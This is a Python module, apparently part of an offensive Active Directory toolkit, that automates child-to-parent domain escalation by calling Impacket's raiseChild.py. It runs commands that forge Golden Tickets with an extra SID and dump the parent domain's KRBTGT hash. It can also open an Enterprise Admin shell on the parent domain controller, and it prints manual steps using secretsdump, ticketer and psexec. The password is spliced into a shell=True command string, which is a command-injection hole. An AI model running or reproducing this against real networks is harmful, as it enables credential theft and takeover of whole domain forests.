"""
Impacket SID History Injector
Automated child-to-parent domain escalation using raiseChild.py
"""

import subprocess
import shutil
from typing import Optional, List
from pathlib import Path
from datetime import datetime

from .base import BaseInjector
from ..models import InjectionOperation, InjectionStatus


class ImpacketInjector(BaseInjector):
    """
    Inject SID history using Impacket's raiseChild.py

    This tool automates the entire child-to-parent escalation:
    1. Creates Golden Ticket in child domain
    2. Requests inter-realm TGT to parent
    3. Gets TGS for parent DC
    4. Uses DCSync to dump parent KRBTGT

    Requirements:
    - Domain Admin on child domain
    - Impacket installed
    - Network access to both DCs
    """

    def __init__(self, output_dir: str = "sid_history", verbose: bool = True):
        """
        Initialize Impacket injector

        Args:
            output_dir: Directory for output files
            verbose: Print status messages
        """
        super().__init__(output_dir, verbose)
        self.timeout = 120  # raiseChild can take a while

    def is_available(self) -> bool:
        """Check if Impacket raiseChild.py is available"""
        return shutil.which("raiseChild.py") is not None

    def generate_commands(self, operation: InjectionOperation) -> List[str]:
        """
        Generate raiseChild.py command

        Args:
            operation: InjectionOperation

        Returns:
            List with raiseChild command
        """
        # Note: We don't include password in saved commands for security
        commands = [
            "# Impacket raiseChild.py - Automated Child-to-Parent Escalation",
            "",
            "# This command will:",
            "#   1. Create Golden Ticket in child domain",
            "#   2. Request inter-realm TGT to parent domain",
            "#   3. Get TGS for parent domain DC",
            "#   4. Perform DCSync on parent domain",
            "#   5. Dump Enterprise Admin credentials",
            "",
            f"# raiseChild.py {operation.target_domain}/USERNAME:'PASSWORD'@DC_IP",
            "",
            "# With target-exec to get shell:",
            f"# raiseChild.py {operation.target_domain}/USERNAME:'PASSWORD' -target-exec DC_IP",
        ]

        return commands

    def inject(
            self,
            operation: InjectionOperation,
            username: Optional[str] = None,
            password: Optional[str] = None,
    ) -> bool:
        """
        Execute raiseChild.py for automated escalation

        Args:
            operation: InjectionOperation with details
            username: Domain Admin username
            password: Domain Admin password

        Returns:
            True if successful
        """
        self.log("Executing Impacket raiseChild.py for automated escalation...")
        self.log(f"Child domain: {operation.target_domain}")
        self.log(f"Target SID: {operation.sid_to_inject}")

        if not username or not password:
            self.log("Username and password required for raiseChild", "error")
            return False

        if not operation.dc_ip:
            self.log("DC IP required for raiseChild", "error")
            return False

        operation.mark_started()

        # Build command
        cmd = f"raiseChild.py {operation.target_domain}/{username}:'{password}'@{operation.dc_ip}"

        self.log(f"Executing: raiseChild.py {operation.target_domain}/{username}:***@{operation.dc_ip}")

        try:
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=self.timeout
            )

            # Save output
            output_file = self.output_dir / f"raiseChild_output_{operation.target_domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

            with open(output_file, 'w') as f:
                f.write(f"# raiseChild.py Output\n")
                f.write(f"# Target: {operation.target_domain}\n")
                f.write(f"# Time: {datetime.now().isoformat()}\n\n")
                f.write("STDOUT:\n")
                f.write(result.stdout)
                f.write("\n\nSTDERR:\n")
                f.write(result.stderr)

            operation.output_file = str(output_file)

            if result.returncode == 0:
                self.log("raiseChild.py completed successfully!", "success")
                self._parse_output(result.stdout, operation)
                operation.mark_success()
                return True
            else:
                self.log(f"raiseChild.py failed with code {result.returncode}", "error")
                self.log(f"Error: {result.stderr}", "error")
                operation.mark_failed(result.stderr)
                return False

        except subprocess.TimeoutExpired:
            self.log("raiseChild.py timeout", "error")
            operation.mark_failed("Timeout")
            return False
        except Exception as e:
            self.log(f"Error: {e}", "error")
            operation.mark_failed(str(e))
            return False

    def _parse_output(self, output: str, operation: InjectionOperation) -> None:
        """
        Parse raiseChild output for important information

        Args:
            output: Command output
            operation: InjectionOperation to update
        """
        print(f"\n" + "=" * 60)
        print("RAISECHILD.PY RESULTS")
        print("=" * 60)

        # Look for key indicators
        if "Enterprise Admin" in output or "519" in output:
            self.log("Enterprise Admin access confirmed!", "success")

        if "KRBTGT" in output.upper():
            self.log("KRBTGT hash extracted from parent domain!", "success")

        # Print sanitized output
        for line in output.split('\n'):
            if any(key in line.upper() for key in ['KRBTGT', 'HASH', 'SID', 'ADMIN', 'TICKET']):
                print(f"  {line}")

    def inject_with_target_exec(
            self,
            operation: InjectionOperation,
            username: str,
            password: str,
            target_dc: str
    ) -> bool:
        """
        Execute raiseChild with target-exec to get shell on parent DC

        Args:
            operation: InjectionOperation
            username: DA username
            password: DA password
            target_dc: Parent DC to get shell on

        Returns:
            True if successful
        """
        self.log("Executing raiseChild.py with target-exec for remote shell...")

        operation.mark_started()

        cmd = f"raiseChild.py {operation.target_domain}/{username}:'{password}' -target-exec {target_dc}"

        self.log(f"This will attempt to get a shell on: {target_dc}")
        self.log("You will have Enterprise Admin privileges!")

        try:
            # Interactive - don't capture output
            self.log("Launching interactive shell...", "success")

            result = subprocess.run(
                cmd,
                shell=True,
                timeout=self.timeout
            )

            if result.returncode == 0:
                operation.mark_success()
                return True
            else:
                operation.mark_failed(f"Exit code: {result.returncode}")
                return False

        except subprocess.TimeoutExpired:
            self.log("Operation timeout", "error")
            operation.mark_failed("Timeout")
            return False
        except Exception as e:
            self.log(f"Error: {e}", "error")
            operation.mark_failed(str(e))
            return False

    def generate_manual_steps(self, operation: InjectionOperation) -> List[str]:
        """
        Generate manual steps if automated execution fails

        Args:
            operation: InjectionOperation

        Returns:
            List of manual steps
        """
        steps = [
            "# Manual Child-to-Parent Escalation Steps",
            "",
            "# Step 1: Dump child domain KRBTGT hash",
            f"secretsdump.py {operation.target_domain}/admin:'password'@child-dc-ip",
            "",
            "# Step 2: Get child domain SID",
            f"lookupsid.py {operation.target_domain}/admin:'password'@child-dc-ip",
            "",
            "# Step 3: Get parent domain SID (Enterprise Admins = -519)",
            f"# Parent SID: {operation.sid_to_inject.rsplit('-', 1)[0] if operation.sid_to_inject else 'PARENT-SID'}",
            "",
            "# Step 4: Create Golden Ticket with ExtraSids",
            "ticketer.py -nthash KRBTGT_HASH \\",
            f"  -domain-sid CHILD_DOMAIN_SID \\",
            f"  -domain {operation.target_domain} \\",
            f"  -extra-sid {operation.sid_to_inject} \\",
            "  administrator",
            "",
            "# Step 5: Use ticket to access parent domain",
            "export KRB5CCNAME=administrator.ccache",
            "psexec.py -k -no-pass parent-dc",
        ]

        return steps